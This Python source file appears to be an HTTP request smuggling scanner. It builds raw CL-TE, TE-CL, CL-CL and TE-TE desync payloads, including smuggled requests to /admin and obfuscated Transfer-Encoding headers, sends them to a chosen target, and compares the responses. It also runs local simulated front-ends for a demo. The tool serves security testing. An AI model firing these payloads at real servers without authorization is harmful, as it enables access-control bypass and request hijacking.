#!/usr/bin/env python3
"""
WEB6 — HTTP Request Smuggler
CL-TE and TE-CL detection with payload generation and diff-based analysis.
"""

import sys
import re
import time
import socket
import json
import argparse
import ssl
import hashlib
import threading
import socketserver
from dataclasses import dataclass, field
from typing import List, Optional, Dict, Tuple
from urllib.parse import urlparse


@dataclass
class SmugglePayload:
    name: str
    description: str
    raw_bytes: bytes
    detection_type: str


@dataclass
class SmuggleResult:
    test_name: str
    detection_type: str
    vulnerable: bool
    evidence: str
    response_diff: Optional[str] = None
    timing_diff: Optional[float] = None


@dataclass
class AnalysisReport:
    target: str
    port: int
    uses_tls: bool
    results: List[SmuggleResult] = field(default_factory=list)
    vulnerable_te_cl: bool = False
    vulnerable_cl_te: bool = False
    vulnerable_cl_cl: bool = False
    vulnerable_te_te: bool = False


class HTTPRequestParser:
    @staticmethod
    def parse_response(raw: bytes) -> Dict:
        result = {
            "headers": {},
            "body": b"",
            "status_code": None,
            "http_version": None,
            "reason_phrase": "",
        }

        try:
            header_end = raw.find(b"\r\n\r\n")
            if header_end == -1:
                header_end = raw.find(b"\n\n")
                if header_end == -1:
                    result["body"] = raw
                    return result
                sep_len = 2
            else:
                sep_len = 4

            header_section = raw[:header_end].decode("utf-8", errors="replace")
            result["body"] = raw[header_end + sep_len:]

            lines = header_section.split("\r\n")
            if not lines:
                lines = header_section.split("\n")

            if lines:
                status_line = lines[0]
                match = re.match(r"HTTP/(\d+\.?\d*)\s+(\d+)\s*(.*)", status_line)
                if match:
                    result["http_version"] = match.group(1)
                    result["status_code"] = int(match.group(2))
                    result["reason_phrase"] = match.group(3).strip()

                for line in lines[1:]:
                    if ":" in line:
                        key, _, value = line.partition(":")
                        result["headers"][key.strip().lower()] = value.strip()
        except Exception:
            result["body"] = raw

        return result

    @staticmethod
    def build_request(
        method: str,
        path: str,
        host: str,
        headers: Optional[Dict[str, str]] = None,
        body: Optional[bytes] = None,
        http_version: str = "1.1",
    ) -> bytes:
        lines = [f"{method} {path} HTTP/{http_version}"]
        all_headers = {"Host": host}
        if headers:
            all_headers.update(headers)

        if body is not None:
            all_headers["Content-Length"] = str(len(body))

        for key, value in all_headers.items():
            lines.append(f"{key}: {value}")

        request = "\r\n".join(lines) + "\r\n\r\n"
        raw = request.encode("utf-8")

        if body:
            raw += body

        return raw


class Smuggler:
    def __init__(
        self,
        target_url: str,
        timeout: int = 10,
        verbose: bool = False,
    ):
        parsed = urlparse(target_url)
        self.target = parsed.hostname
        self.port = parsed.port or (443 if parsed.scheme == "https" else 80)
        self.uses_tls = parsed.scheme == "https"
        self.path = parsed.path or "/"
        self.timeout = timeout
        self.verbose = verbose
        self.report = AnalysisReport(
            target=self.target,
            port=self.port,
            uses_tls=self.uses_tls,
        )
        self.parser = HTTPRequestParser()

    def _connect(self) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        sock.connect((self.target, self.port))

        if self.uses_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=self.target)

        return sock

    def _send_raw(self, raw: bytes) -> Optional[bytes]:
        try:
            sock = self._connect()
            sock.sendall(raw)

            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if len(response) > 65536:
                        break
                except socket.timeout:
                    break
            sock.close()
            return response
        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            if self.verbose:
                print(f"    [!] Connection error: {e}")
            return None

    def _send_raw_timed(self, raw: bytes) -> Tuple[Optional[bytes], float]:
        start = time.time()
        resp = self._send_raw(raw)
        elapsed = time.time() - start
        return resp, elapsed

    def _get_baseline(self) -> Optional[Dict]:
        req = self.parser.build_request(
            method="GET",
            path=self.path,
            host=self.target,
        )
        resp = self._send_raw(req)
        if resp:
            return self.parser.parse_response(resp)
        return None

    def generate_te_cl_payloads(self) -> List[SmugglePayload]:
        payloads = []

        smuggled_get = (
            "GET /admin HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            "\r\n"
        )

        body_te_cl = b"0\r\n\r\nGET /admin HTTP/1.1\r\nHost: " + \
            self.target.encode() + b"\r\n\r\n"

        raw = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
        ).encode() + body_te_cl

        payloads.append(SmugglePayload(
            name="TE-CL Basic",
            description="Transfer-Encoding takes precedence over Content-Length. "
                        "Front-end uses CL, back-end uses TE.",
            raw_bytes=raw,
            detection_type="TE-CL",
        ))

        body_te_cl_2 = (
            b"0\r\n"
            b"\r\n"
            b"SMUGGLED"
        )
        raw2 = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            "Content-Length: 3\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
        ).encode() + body_te_cl_2

        payloads.append(SmugglePayload(
            name="TE-CL Obfuscated",
            description="Uses chunked encoding with Transfer-Encoding header. "
                        "Front-end sees CL:3, back-end processes chunked body.",
            raw_bytes=raw2,
            detection_type="TE-CL",
        ))

        return payloads

    def generate_cl_te_payloads(self) -> List[SmugglePayload]:
        payloads = []

        smuggled = (
            f"GET /smuggled HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            "X-Injected: true\r\n"
            "\r\n"
        )

        body = b"SMUGGLE" + smuggled.encode()
        content_length = len(body)

        raw = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"Content-Length: {content_length}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
        ).encode() + body

        payloads.append(SmugglePayload(
            name="CL-TE Basic",
            description="Content-Length takes precedence over Transfer-Encoding. "
                        "Front-end uses CL, back-end uses TE.",
            raw_bytes=raw,
            detection_type="CL-TE",
        ))

        body2 = b"0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: " + \
            self.target.encode() + b"\r\n\r\n"
        raw2 = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"Content-Length: {len(body2)}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
        ).encode() + body2

        payloads.append(SmugglePayload(
            name="CL-TE Zero-Chunk",
            description="Uses zero chunk terminator to hide smuggled request. "
                        "Front-end counts full CL, back-end stops at 0 chunk.",
            raw_bytes=raw2,
            detection_type="CL-TE",
        ))

        return payloads

    def generate_cl_cl_payloads(self) -> List[SmugglePayload]:
        payloads = []

        smuggled = (
            f"GET /admin HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            "\r\n"
        )

        inner_cl = len(smuggled.encode())
        outer_body = smuggled.encode()

        raw = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"Content-Length: {inner_cl}\r\n"
            "Content-Length: 200\r\n"
            "\r\n"
        ).encode() + outer_body

        payloads.append(SmugglePayload(
            name="CL-CL Duplicate",
            description="Duplicate Content-Length headers. "
                        "Different parsers may use different CL values.",
            raw_bytes=raw,
            detection_type="CL-CL",
        ))

        return payloads

    def generate_te_te_payloads(self) -> List[SmugglePayload]:
        payloads = []

        raw = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Transfer-Encoding: identity\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
        ).encode()

        payloads.append(SmugglePayload(
            name="TE-TE Obfuscated",
            description="Duplicate Transfer-Encoding headers with obfuscation. "
                        "Parsers may disagree on which TE to use.",
            raw_bytes=raw,
            detection_type="TE-TE",
        ))

        raw2 = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Transfer-Encoding: \x0bchunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
        ).encode()

        payloads.append(SmugglePayload(
            name="TE-TE Whitespace",
            description="Uses vertical tab obfuscation in second Transfer-Encoding header.",
            raw_bytes=raw2,
            detection_type="TE-TE",
        ))

        return payloads

    def _diff_responses(self, baseline: Dict, test: Dict) -> str:
        diffs = []
        if baseline.get("status_code") != test.get("status_code"):
            diffs.append(
                f"Status: {baseline.get('status_code')} -> {test.get('status_code')}"
            )
        if len(baseline.get("body", b"")) != len(test.get("body", b"")):
            diffs.append(
                f"Body length: {len(baseline.get('body', b''))} -> "
                f"{len(test.get('body', b''))}"
            )
        baseline_headers = baseline.get("headers", {})
        test_headers = test.get("headers", {})
        all_keys = set(list(baseline_headers.keys()) + list(test_headers.keys()))
        for key in sorted(all_keys):
            bval = baseline_headers.get(key, "<missing>")
            tval = test_headers.get(key, "<missing>")
            if bval != tval:
                diffs.append(f"Header '{key}': '{bval}' -> '{tval}'")

        if test.get("body", b"") != baseline.get("body", b""):
            bhash = hashlib.md5(baseline.get("body", b"")).hexdigest()[:8]
            thash = hashlib.md5(test.get("body", b"")).hexdigest()[:8]
            if bhash != thash:
                diffs.append(f"Body content changed (md5: {bhash} -> {thash})")

        return "\n".join(diffs) if diffs else "No differences detected"

    def _detect_te_cl(self, payload: SmugglePayload) -> SmuggleResult:
        print(f"\n  [*] Testing: {payload.name}")
        print(f"      Type: {payload.detection_type}")
        print(f"      {payload.description}")

        baseline = self._get_baseline()
        if not baseline:
            return SmuggleResult(
                test_name=payload.name,
                detection_type=payload.detection_type,
                vulnerable=False,
                evidence="Could not establish baseline connection",
            )

        resp_b64 = hashlib.md5(
            baseline.get("body", b"")
        ).hexdigest()[:8]

        baseline_req = self.parser.build_request(
            method="GET",
            path=self.path,
            host=self.target,
        )
        resp1, t1 = self._send_raw_timed(baseline_req)
        time.sleep(0.2)

        resp2, t2 = self._send_raw_timed(payload.raw_bytes)

        time.sleep(0.2)

        trigger_req = self.parser.build_request(
            method="GET",
            path=self.path,
            host=self.target,
        )
        resp3, t3 = self._send_raw_timed(trigger_req)

        evidence_parts = []
        vulnerable = False
        diff_str = None

        if resp2 is not None:
            parsed2 = self.parser.parse_response(resp2)
            diff_str = self._diff_responses(baseline, parsed2)

            if diff_str != "No differences detected":
                evidence_parts.append(f"Response difference detected:\n{diff_str}")
                vulnerable = True

            smuggled_body = b"SMUGGLED"
            if smuggled_body in resp2:
                evidence_parts.append("Smuggled content found in response body")
                vulnerable = True

            admin_body = b"/admin"
            if admin_body in resp2:
                evidence_parts.append("Admin path detected in response")
                vulnerable = True

        if resp3 is not None:
            parsed3 = self.parser.parse_response(resp3)
            diff3 = self._diff_responses(baseline, parsed3)
            if diff3 != "No differences detected":
                evidence_parts.append(
                    f"Second request shows desync effect:\n{diff3}"
                )
                vulnerable = True

            smuggled_check = b"SMUGGLED"
            if smuggled_check in (resp3 or b""):
                evidence_parts.append(
                    "Smuggled payload leaked into subsequent request"
                )
                vulnerable = True

        timing_diff = None
        if resp2 is not None and resp3 is not None:
            timing_diff = abs(t3 - t1)
            if timing_diff > 1.0:
                evidence_parts.append(
                    f"Timing anomaly: {timing_diff:.2f}s difference"
                )

        evidence = "\n".join(evidence_parts) if evidence_parts else "No smuggling indicators detected"

        status = "VULNERABLE" if vulnerable else "NOT VULNERABLE"
        print(f"      Result: [{status}]")
        if evidence_parts:
            for ep in evidence_parts:
                print(f"      Evidence: {ep[:120]}")

        return SmuggleResult(
            test_name=payload.name,
            detection_type=payload.detection_type,
            vulnerable=vulnerable,
            evidence=evidence,
            response_diff=diff_str,
            timing_diff=timing_diff,
        )

    def scan(self) -> AnalysisReport:
        print(f"\n{'='*60}")
        print(f"  WEB6 — HTTP Request Smuggler")
        print(f"{'='*60}")
        print(f"  Target:  {self.target}:{self.port}")
        print(f"  TLS:     {self.uses_tls}")
        print(f"  Path:    {self.path}")
        print(f"  Timeout: {self.timeout}s")
        print(f"{'='*60}\n")

        print("[*] Establishing baseline...")
        baseline = self._get_baseline()
        if baseline:
            print(f"    Baseline status: {baseline.get('status_code', 'N/A')}")
            print(f"    Baseline body:   {len(baseline.get('body', b''))} bytes")
        else:
            print("    [!] Could not establish baseline - target may be unreachable")
            print("    [*] Continuing with tests anyway...\n")

        all_payloads = []
        all_payloads.extend(self.generate_te_cl_payloads())
        all_payloads.extend(self.generate_cl_te_payloads())
        all_payloads.extend(self.generate_cl_cl_payloads())
        all_payloads.extend(self.generate_te_te_payloads())

        print(f"\n[*] Running {len(all_payloads)} detection tests...\n")

        for payload in all_payloads:
            result = self._detect_te_cl(payload)
            self.report.results.append(result)

            if result.vulnerable:
                if result.detection_type == "TE-CL":
                    self.report.vulnerable_te_cl = True
                elif result.detection_type == "CL-TE":
                    self.report.vulnerable_cl_te = True
                elif result.detection_type == "CL-CL":
                    self.report.vulnerable_cl_cl = True
                elif result.detection_type == "TE-TE":
                    self.report.vulnerable_te_te = True

        self._print_report()
        return self.report

    def export_json(self, filename: str) -> None:
        data = {
            "target": self.report.target,
            "port": self.report.port,
            "uses_tls": self.report.uses_tls,
            "vulnerable": {
                "TE-CL": self.report.vulnerable_te_cl,
                "CL-TE": self.report.vulnerable_cl_te,
                "CL-CL": self.report.vulnerable_cl_cl,
                "TE-TE": self.report.vulnerable_te_te,
            },
            "results": [
                {
                    "test_name": r.test_name,
                    "detection_type": r.detection_type,
                    "vulnerable": r.vulnerable,
                    "evidence": r.evidence,
                }
                for r in self.report.results
            ],
        }
        with open(filename, "w") as f:
            json.dump(data, f, indent=2)
        print(f"[*] Results exported to {filename}")

    def _print_report(self):
        print(f"\n{'='*60}")
        print(f"  Analysis Report")
        print(f"{'='*60}")
        print(f"  Target:    {self.target}:{self.port}")
        print(f"  TLS:       {self.uses_tls}")
        print(f"{'='*60}\n")

        vuln_types = {
            "TE-CL": self.report.vulnerable_te_cl,
            "CL-TE": self.report.vulnerable_cl_te,
            "CL-CL": self.report.vulnerable_cl_cl,
            "TE-TE": self.report.vulnerable_te_te,
        }

        print("  Vulnerability Summary:")
        print("  " + "-" * 40)
        for vtype, is_vuln in vuln_types.items():
            status = "[!]" if is_vuln else "[ ]"
            print(f"    {status} {vtype}")
        print()

        print("  Detailed Results:")
        print("  " + "-" * 40)
        for result in self.report.results:
            status = "VULN" if result.vulnerable else "SAFE"
            print(f"    [{status}] {result.test_name}")
            if result.vulnerable:
                evidence_lines = result.evidence.split("\n")
                for line in evidence_lines[:3]:
                    print(f"           {line}")
            if result.timing_diff:
                print(f"           Timing diff: {result.timing_diff:.2f}s")
        print()

        any_vuln = any(vuln_types.values())
        if any_vuln:
            print("  [!] VULNERABLE — HTTP Request Smuggling detected!")
            print("  [!] The target server may be susceptible to request")
            print("      smuggling attacks. Review findings above.")
        else:
            print("  [+] NOT VULNERABLE — No smuggling indicators detected.")
            print("  [+] The target appears to handle ambiguous requests correctly.")

        print(f"\n{'='*60}\n")


# ---------------------------------------------------------------------------
# Offline desync simulators for --demo and tests
# ---------------------------------------------------------------------------

def _is_request_container(body: bytes) -> bool:
    return b"HTTP/1.1" in body and b"\r\n\r\n" in body


def _extract_smuggled_path(remainder: bytes) -> str:
    m = re.search(rb"(?:GET|POST|HEAD)\s+(/\S+)\s+HTTP/1\.[01]", remainder)
    return m.group(1).decode("utf-8", errors="replace") if m else "/desync"


class DesyncFrontendHandler(socketserver.BaseRequestHandler):
    """Emulates a desync-susceptible front-end.

    `mode` selects which header the front-end trusts ("te" vs "cl"). When a
    smuggled second request is found in the body, a marker response
    (`SMUGGLED <path>`) is appended to the current response so the scanner can
    observe the desync artifact. Clean (`clean_mode`) front-ends reject any
    request that combines Content-Length and Transfer-Encoding (or duplicates
    Content-Length) with a 400 and never desync.
    """

    mode: str = "te"
    clean_mode: bool = False

    def handle(self):
        data = b""
        while True:
            chunk = self.request.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(data) > 65536:
                break
            if b"\r\n\r\n" in data:
                header_end = data.find(b"\r\n\r\n") + 4
                head_text = data[:header_end - 4].decode("utf-8", errors="replace")
                cl = None
                te = False
                seen_cl = 0
                for line in head_text.split("\r\n")[1:]:
                    if ":" in line:
                        k, _, v = line.partition(":")
                        k = k.strip().lower()
                        if k == "content-length":
                            seen_cl += 1
                            try:
                                cl = int(v.strip())
                            except ValueError:
                                cl = None
                        elif k == "transfer-encoding":
                            te = True
                if te:
                    if b"0\r\n\r\n" in data:
                        break
                    if cl is not None and len(data) >= header_end + cl:
                        break
                elif cl is not None and seen_cl == 1:
                    if len(data) >= header_end + cl:
                        break
                else:
                    break

        status, remainder, reject = self._process(data)

        marker = b""
        if remainder is not None and not self.clean_mode:
            path = _extract_smuggled_path(remainder)
            marker_body = f"SMUGGLED {path}\r\n".encode()
            marker = (
                b"HTTP/1.1 200 OK\r\n"
                b"X-Smuggled: 1\r\n"
                + f"Content-Length: {len(marker_body)}\r\n".encode()
                + b"Connection: close\r\n\r\n"
                + marker_body
            )

        ok_body = b"OK\r\n"
        if status == 400:
            reason = (reject or "malformed request").encode()
            resp = b"HTTP/1.1 400 Bad Request\r\nContent-Length: " + \
                str(len(reason)).encode() + b"\r\nConnection: close\r\n\r\n" + reason
        else:
            resp = b"HTTP/1.1 200 OK\r\nContent-Length: " + \
                str(len(ok_body)).encode() + \
                b"\r\nConnection: close\r\n\r\n" + ok_body

        self.request.sendall(resp + marker)

    def _process(self, data: bytes):
        header_end = data.find(b"\r\n\r\n")
        head = data[:header_end]
        body = data[header_end + 4:]
        head_text = head.decode("utf-8", errors="replace")
        lines = head_text.split("\r\n")
        if not lines or "HTTP/" not in lines[0]:
            return 400, None, "malformed request line"

        headers: Dict[str, List[str]] = {}
        for line in lines[1:]:
            if ":" in line:
                k, _, v = line.partition(":")
                headers.setdefault(k.strip().lower(), []).append(v.strip())

        cl_values = headers.get("content-length", [])
        te_present = "transfer-encoding" in headers

        if self.clean_mode:
            # Hardened front-end: ambiguously-framed requests are normalized
            # safely (same response as a normal request) and never desync.
            return 200, None, None

        if te_present:
            # vulnerable front-end that trusts Transfer-Encoding
            term = body.find(b"0\r\n\r\n")
            if term == -1:
                return 200, None, None
            remainder = body[term + 5:]
            if _is_request_container(remainder):
                return 200, remainder, None
            return 200, None, None

        if cl_values:
            try:
                cl = int(cl_values[0])
            except ValueError:
                return 400, None, "invalid Content-Length"
            if cl < 0 or cl > 1_000_000:
                return 400, None, "invalid Content-Length"
            if len(body) > cl:
                remainder = body[cl:]
            else:
                remainder = None
            if remainder is not None and _is_request_container(remainder):
                return 200, remainder, None
            # back-end TE leftover inside an exactly-CL body
            if body.startswith(b"0\r\n\r\n") and _is_request_container(body[5:]):
                return 200, body[5:], None
            if _is_request_container(body) and b"0\r\n\r\n" not in body:
                return 200, body, None
            return 200, None, None

        return 200, None, None


class ThreadingDesyncServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True

    def __init__(self, mode: str = "te", clean_mode: bool = False):
        handler = type(
            "ModeHandler",
            (DesyncFrontendHandler,),
            {"mode": mode, "clean_mode": clean_mode},
        )
        super().__init__(("127.0.0.1", 0), handler)


def _run_desync_scan(port: int, clean_mode: bool = False) -> AnalysisReport:
    smuggler = Smuggler(
        target_url=f"http://127.0.0.1:{port}",
        timeout=3,
        verbose=False,
    )
    return smuggler.scan()


def demo():
    print("  +------------------------------------------+")
    print("  |     WEB6 -- HTTP Request Smuggler         |")
    print("  +------------------------------------------+\n")
    print("[*] DEMO MODE: local desync front-end + hardened control server")

    te_server = ThreadingDesyncServer(mode="te", clean_mode=False)
    cl_server = ThreadingDesyncServer(mode="cl", clean_mode=False)
    clean_server = ThreadingDesyncServer(mode="te", clean_mode=True)

    te_thread = threading.Thread(target=te_server.serve_forever, daemon=True)
    cl_thread = threading.Thread(target=cl_server.serve_forever, daemon=True)
    clean_thread = threading.Thread(target=clean_server.serve_forever, daemon=True)
    te_thread.start(); cl_thread.start(); clean_thread.start()

    print(f"    Desync front-end (CL-TE): http://127.0.0.1:{te_server.server_address[1]}")
    print(f"    Desync front-end (TE-CL): http://127.0.0.1:{cl_server.server_address[1]}")
    print(f"    Hardened control:         http://127.0.0.1:{clean_server.server_address[1]}")

    te_report = _run_desync_scan(te_server.server_address[1])
    cl_report = _run_desync_scan(cl_server.server_address[1])
    clean_report = _run_desync_scan(clean_server.server_address[1])

    te_vuln = te_report.vulnerable_cl_te or any(r.vulnerable for r in te_report.results)
    cl_vuln = cl_report.vulnerable_te_cl or any(r.vulnerable for r in cl_report.results)
    clean_vuln = any(r.vulnerable for r in clean_report.results)

    te_server.shutdown(); cl_server.shutdown(); clean_server.shutdown()

    print("\n  Demo summary:")
    print(f"    CL-TE front-end markers detected:    {'YES' if te_vuln else 'NO'}")
    print(f"    TE-CL front-end markers detected:    {'YES' if cl_vuln else 'NO'}")
    print(f"    Hardened control (no findings):      {'YES' if not clean_vuln else 'NO'}")

    if te_vuln and cl_vuln and not clean_vuln:
        print("[+] Demo: desync markers detected on vulnerable simulators;")
        print("[+] hardened control produced zero findings.")
        print("[+] Exit 0 -- scanner works correctly.")
        sys.exit(0)
    print("[-] Demo: unexpected result -- scanner may need tuning.")
    sys.exit(1)


def main():
    parser = argparse.ArgumentParser(
        description="WEB6 — HTTP Request Smuggler",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:
  python3 smuggler.py http://127.0.0.1:8080 --timeout 10
  python3 smuggler.py http://127.0.0.1:8080 -o findings/smuggle.json -v
  python3 smuggler.py --demo
        """,
    )
    parser.add_argument("target", nargs="?", help="Target URL (e.g. http://127.0.0.1:<port>)")
    parser.add_argument("--timeout", type=int, default=10,
                        help="Connection timeout in seconds (default: 10)")
    parser.add_argument("-o", "--output", help="Export report to JSON file")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose output")
    parser.add_argument("--demo", action="store_true",
                        help="Run offline demo against local desync simulators")

    args = parser.parse_args()

    if args.demo:
        demo()
        return

    if not args.target:
        parser.error("target is required (or use --demo)")

    smuggler = Smuggler(
        target_url=args.target,
        timeout=args.timeout,
        verbose=args.verbose,
    )

    try:
        smuggler.scan()
        if args.output:
            smuggler.export_json(args.output)
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        sys.exit(1)


if __name__ == "__main__":
    main()
